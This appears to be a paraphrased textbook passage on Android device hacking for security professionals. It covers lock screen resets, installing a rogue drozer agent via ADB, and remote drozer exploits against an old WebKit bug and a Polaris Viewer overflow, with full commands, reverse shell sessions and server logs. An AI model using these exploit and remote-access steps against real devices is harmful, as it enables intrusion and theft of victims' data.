### Credential Theft and Lock Screen Reset

An unauthorized individual may have stolen credentials to reset the lock screen on a device. Figure 8.4 illustrates the Device Manager web interface after clicking the "Lock" button and the message displayed on the locked device.

**Figure 8.3:**
- Shows the "Forgot pattern?" button and the resulting screen when pressed.

**Figure 8.4:**
- Demonstrates the Android Device Manager's "Lock" functionality and the resulting screen on the locked device.

### Device-Specific Lock Screen Resets

Some manufacturers include proprietary applications on their devices, which may offer functionality to reset the lock screen. To determine if this is possible for a specific device, you would need to investigate the manufacturer's applications. However, these features typically require authentication similar to the standard Android methods. If no appropriate authentication is required, it is considered a security vulnerability.

### Installing a Rogue drozer Agent via ADB

Once you have an ADB shell, you can install tools on the device to enable remote access. A rogue drozer agent can be generated and installed using ADB. The agent must be started from ADB because Android applications are disabled by default upon installation. To start the agent, use the following command:

```sh
shell@android:/ $ am startservice -n com.mwr.dz/.Agent
```

You can also use the `exploit.usb.socialengineering.usbdebugging` module in drozer to quickly install and invoke the agent. Here is an example:

```sh
$ drozer exploit build exploit.usb.socialengineering.usbdebugging --server 192.168.1.102
[*] Building Rogue Agent...
[*] Checking adb setup...
[+] adb is set up correctly
[*] Connect device and press [ENTER]
[*] Attempting to install agent...
[+] Rogue Agent installed
[*] Attempting to kick start drozer agent - Method 1 (Service)
[+] Service started. You should have a connection on your server
```

After starting the service, a new drozer session is established with the drozer server:

```sh
2014-10-30 21:16:28,925 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 5fe89aa7ae424b6
```

If you obtain an ADB shell through an unlocked bootloader, focus on bypassing the lock screen to get an ADB shell on the working system. From the exploited bootloader, you can push a new application and place the APK in the `/data/app/` directory. However, you will need another method to invoke the agent and enable it for the first run.

### Practical Remote Attacks

Understanding which attacks work against specific targets and Android versions is crucial for successful hacking. This section provides a hands-on approach to remotely hacking Android devices, helping security professionals develop preventive measures.

#### Remote Exploits

Remote exploits are ideal for maintaining anonymity, as they can be launched over the Internet with minimal traceability. We will cover examples of remote exploits and explore three modes of exploitation with drozer's payload:

1. **Loading a drozer JAR that loads a limited agent**
2. **Installing and starting a rogue drozer agent by abusing `INSTALL_PACKAGES`**
3. **Loading a drozer JAR that is passed Context**

These modes will be explored in subsequent subsections.

#### Browser Memory Corruption

Memory corruption exploits are highly technical and target users' browsers. Google has implemented numerous mitigations, making browser exploits on the latest Android versions challenging. Let's consider an older, simpler exploit: CVE-2010-1759, a WebKit vulnerability in the DOM normalize method reported by Mark Dowd.

To begin, start a drozer server and use the `exploit.remote.browser.normalize` module with a reverse TCP weasel payload:

```sh
$ drozer exploit build exploit.remote.browser.normalize --payload weasel.reverse_tcp.armeabi --server 192.168.1.112 --push-server 127.0.0.1 --resource /
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading blank page to /... [ OK ]
Uploading Exploit to /... [ OK ]
Done. The exploit is available on: http://192.168.1.112:31415/
```

Browsing to this server from an Android 2.2 device yields the following in the drozer server log and closes the browser:

```sh
2014-11-09 15:02:03,914 - drozer.server.protocols.http - INFO - GET /
2014-11-09 15:02:26,221 - drozer.server.protocols.byte_stream - INFO - MAGIC W
2014-11-09 15:02:26,461 - drozer.server.protocols.shell - INFO - accepted shell from 192.168.1.112:46376
2014-11-09 15:02:26,465 - drozer.server.protocols.http - INFO - GET /agent.jar
2014-11-09 15:02:26,470 - drozer.server.protocols.http - INFO - GET /agent.apk
2014-11-09 15:02:28,416 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 1rp1edub6ieru
```

This output indicates a normal reverse shell connection and a drozer connection. Querying the server confirms the drozer connection:

```sh
$ drozer console devices
List of Bound Devices
Device ID Manufacturer Model Software
1rp1edub6ieru unknown unknown unknown
```

Connecting to the instance shows a `dz-limited>` prompt, indicating no Context:

```sh
$ drozer console connect 1rp1edub6ieru
drozer Console (v2.3.4)
dz-limited> permissions
Has ApplicationContext: NO
```

This session disables all functionality requiring Context but still allows file pilfering and privilege escalation. You can get a normal shell by typing:

```sh
dz-limited> shell
$ id
uid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)
$ exit
```

For the other reverse shell connection, use netcat or telnet:

```sh
$ nc 127.0.0.1 31415
COLLECT
drozer Shell Server
-------------------
There are 1 shells waiting...
192.168.1.112:46376
Shell: 192.168.1.112:46376
Selecting Shell: 192.168.1.112:46376
$ id
uid=10019(app_19) gid=10019(app_19) groups=1015(sdcard_rw),3003(inet)
$ ^C
```

Terminating the shell with `Control+C` instead of `exit` is important to avoid closing the shell connection with the remote victim.

#### Polaris Viewer Memory Corruption

Polaris Viewer, created by Infraware, reads office documents and PDFs and is pre-installed on some devices. At Mobile Pwn2Own 2012, MWR InfoSecurity demonstrated an exploit against a Samsung Galaxy S3, exploiting a stack-based overflow in the VML shape parsing of the Polaris library. The application had the `INSTALL_PACKAGES` permission, allowing the installation of arbitrary applications.

The `exploit.remote.fileformat.polarisviewerbof_browserdelivery` module in drozer hosts the malicious document and an `auth.bin` file. To set up the attack:

```sh
$ drozer exploit build exploit.remote.fileformat.polarisviewerbof_browserdelivery --payload weasel.shell.armeabi --server 192.168.1.112
Uploading weasel to /weasel and W... [ OK ]
Packaging an Agent... (this may take some time)
Uploading the Agent to /agent.apk and A... [ OK ]
Uploading blank page to /... [ OK ]
Uploading shell script to auth.bin... [ OK ]
Uploading document to /download.docx... [ OK ]
Uploading web delivery page to \/view\.jsp\?token\=iSI2hvwNosnZiWoq... [ OK ]
Done. Exploit delivery page is available on: http://192.168.1.112:31415/view.jsp?token=iSI2hvwNosnZiWoq
```

When the user visits the link, the drozer server logs the following:

```sh
2014-11-09 21:49:42,320 - drozer.server.protocols.http - INFO - GET /
2014-11-09 21:49:49,112 - drozer.server.protocols.http - INFO - GET /
2014-11-09 21:51:10,112 - drozer.server.protocols.http - INFO - GET /view.jsp?token=iSI2hvwNosnZiWoq
2014-11-09 21:51:10,309 - drozer.server.protocols.http - INFO - GET /auth.bin
2014-11-09 21:51:10,828 - drozer.server.protocols.http - INFO - GET /auth.bin
2014-11-09 21:51:17,381 - drozer.server.protocols.http - INFO - GET /download.docx
2014-11-09 21:51:17,580 - drozer.server.protocols.http - INFO - GET /download.docx
```

Opening the `download.docx` triggers the exploit chain, and the drozer server logs:

```sh
2014-11-09 21:52:30,906 - drozer.server.protocols.shell - INFO - accepted shell from 192.168.1.109:48592
2014-11-09 21:52:30,907 - drozer.server.protocols.http - INFO - GET /agent.jar
2014-11-09 21:52:30,909 - drozer.server.protocols.http - INFO - GET /agent.apk
2014-11-09 21:52:31,964 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 3493i4n3ibqrl
2014-11-09 21:52:37,356 - drozer.server.protocols.drozerp.drozer - INFO - accepted connection from 1b6b125f54bdda30
```

Three connections are established: one reverse shell and two drozer connections. Querying the drozer server:

```sh
$ drozer console devices
List of Bound Devices
Device ID Manufacturer Model Software
1b6b125f54bdda30 samsung GT-I9300 4.0.4
3493i4n3ibqrl unknown unknown unknown
```

Connecting to the session confirms full drozer agent installation and Context:

```sh
$ drozer console connect 1b6b125f54bdda30
drozer Console (v2.3.4)
dz> permissions
Has ApplicationContext: YES
Available Permissions:
- android.permission.ACCESS_COARSE_LOCATION
- android.permission.ACCESS_FINE_LOCATION
- ...
- android.permission.READ_SMS
```

This comprehensive guide covers various methods to exploit and gain control over Android devices, emphasizing the importance of understanding and mitigating such vulnerabilities.